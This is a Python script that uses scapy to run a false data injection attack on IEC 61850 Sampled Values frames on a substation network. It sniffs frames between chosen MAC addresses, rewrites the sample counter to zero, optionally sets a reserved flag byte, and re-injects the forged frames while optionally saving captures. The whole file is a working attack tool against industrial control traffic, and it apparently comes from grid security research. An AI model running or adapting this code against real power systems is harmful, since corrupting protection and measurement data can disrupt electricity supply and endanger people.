import scapy.all as scapy
import datetime
import logging
import time
import os

def flags_reserved(previous_load):
        print(previous_load)
        aux = previous_load.index(b'\x60')
        option_insert = 1
        new_option = option_insert.to_bytes(1, byteorder='big')
        previous_reserved = previous_load[:aux-3]+new_option+previous_load[aux-2:]
        return previous_reserved      

def separation_load(packet):
        tag_ASDU = packet.load.index(b'\xa2')#mark of the byte a2 corresponding smpCnt
        previous = packet.load[:tag_ASDU]
        working = packet.load[tag_ASDU:]
        ASDU_catched = False
        while(ASDU_catched == False):
                if(packet.load[tag_ASDU+1]==93):
                        if(packet.load[tag_ASDU+2]==48):
                                ASDU_catched = True
                else:
                        tag_ASDU += 1
                        previous = packet.load[:tag_ASDU]
                        working = packet.load[tag_ASDU:]
                        tag_ASDU = working.index(b'\xa2')+tag_ASDU

        if(ASDU_catched == True):
                working_index = working.index(b'\x82')
                previous = previous+working[:working_index]
                working = working[working_index:]

        return previous,working

def dict_separation(working_load):
        global previous_load
        dict_tags = {}
        len_packet = 0
        load_position = 0
        for i in working_load:
                values = 0
                if(len_packet==0):
                        i = working_load[0]
                        dic_key = int.to_bytes(i,1,'big')
                        values = working_load[1]
                        dict_tags.setdefault((load_position,dic_key),working_load[1:values+2])
                        len_packet = values+1
                        working_load = working_load
                elif(len_packet<len(working_load)):
                        working_load = working_load[len_packet+1:]
                        if(working_load==b''):
                                break
                        i = working_load[0]
                        dic_key = int.to_bytes(i,1,'big')
                        values = working_load[1]
                        dict_tags.setdefault((load_position,dic_key),working_load[1:values+2])
                        len_packet = values+1
                else:
                        break
                load_position += 1
        return dict_tags

def packet_capture(packet):
    if (datetime.datetime.now().month <= 9):
        month = '0'+str(datetime.datetime.now().month)
    else:
        month = datetime.datetime.now().month

    if (datetime.datetime.now().day <= 9):
        day = '0'+str(datetime.datetime.now().day)
    else:
        day = datetime.datetime.now().day

    if (flag == 0):
        name_pcap = str(datetime.datetime.now().year)+str(month) + \
            str(day)+"-FDI_SV-Flag.pcap"
    elif (flag == 1):
        name_pcap = str(datetime.datetime.now().year)+str(month) + \
            str(day)+"-FDI_SV.pcap"

    try:
        file_pcap = f'PCAP_FILES/{name_pcap}'
        # make the capture of the originall message
        scapy.wrpcap(file_pcap, packet, append=True)
    except:
        os.mkdir('PCAP_FILES', mode=0o777)
        file_pcap = f'PCAP_FILES/{name_pcap}'
        # make the capture of the originall message
        scapy.wrpcap(file_pcap, packet, append=True)

def sniffed(packet):
        global dst_aux
        global src_aux
        global flag
        global save_packet
        global current_time
        global execution_time
        global start_time

        dict_tags = {}

        if((current_time-start_time)>=execution_time):
                raise KeyboardInterrupt
        if((current_time-start_time)<execution_time):
                try:
                        if(packet.type==35002 and packet.dst==dst_aux and packet.src == src_aux ): #identify if is a GOOSE message and not modified yet
                                # packet.show()
                                if (save_packet == 1):
                                        packet_capture(packet)
                                new_load = None
                                previous_load,working_load = separation_load(packet)
                                dict_tags = dict_separation(working_load)
                                aux_smpCnt = tuple([i for i in dict_tags if i[1]==b'\x82'])
                                aux_smpCnt = aux_smpCnt[0] #need to be better
                                aux_number = 0
                                # aux_number = (int.from_bytes(dict_tags.get(aux_smpCnt)[1:], byteorder="big"))+1
                                # aux_number = (int.from_bytes(dict_tags.get(aux_smpCnt)[1:], byteorder="big"))+datetime.datetime.now().hour+1
                                new_smpCnt = aux_number.to_bytes(dict_tags.get(aux_smpCnt)[0], byteorder='big') #new status at the originall we added the current hour plus 1
                                aux = int.to_bytes(dict_tags.get(aux_smpCnt)[0],1,'big')
                                # print(f'aux + new {aux+new_smpCnt}')
                                dict_tags[aux_smpCnt]=aux+new_smpCnt
                                if (flag == 1):
                                        previous_reserved = flags_reserved(previous_load)
                                        new_load = previous_reserved
                                elif (flag == 0):
                                        new_load = previous_load
                                if (start_time == 0):
                                        start_time = time.time()
                                if (current_time == 0 or (current_time-start_time) < execution_time):
                                        for j in dict_tags:
                                                new_load += j[1]+dict_tags.get(j)#creation of the new load of the message
                                                # print(new_load)
                                        packet.load = new_load
                                        scapy.sendp(packet, iface='enp0s3') #send the modify packet to the network
                                        count = 1 #Sended packets
                                        current_time = time.time()
                                        print(f'Elapsed time = {current_time-start_time}')
                                        if (save_packet == 1):
                                                packet_capture(packet)
                                        if ((current_time-start_time) >= execution_time or count == 1):
                                                print(f'The attack has finished\nGoodbye')
                                                raise KeyboardInterrupt
                                        
                except Exception as e:
                        # print(repr(e))
                        if(str(e)=="int too big to convert"):
                                logging.exception('Exception')
                                print(f'Source = {packet.src} Destination = {packet.dst} \n {packet.show}')
                                print(aux_number)
                                time.sleep(5)
                                raise
                        elif(str(e)!='type'):
                                logging.exception('Exception')
                                print(repr(e))
                                raise
                        else:
                                pass
                        
def start():
    global dst_aux
    global src_aux
    global flag
    global save_packet

    global current_time
    global execution_time
    global start_time
    global dict_modified

    global first_date

    start_time = 0
    current_time = 0
    dict_modified = {}
    first_date = None

    print(f'ATTACK FDI')
    dst_aux = input('Enter the destination MAC\n') or '01:0c:cd:04:03:02'
    src_aux = input('Enter the source MAC\n') or 'f8:02:78:10:61:6b'
    flag = int(input('Turn on the flag? \n 0) No \n 1) Yes\n') or 0)
    save_packet = int(
        input('Do You want to save the packets? \n 0) No \n 1) Yes\n') or 0)
    execution_time = int(
        input('Define the time in seconds to run the attack ') or 60)
    a = scapy.sniff(iface='enp0s3', prn=sniffed)

start()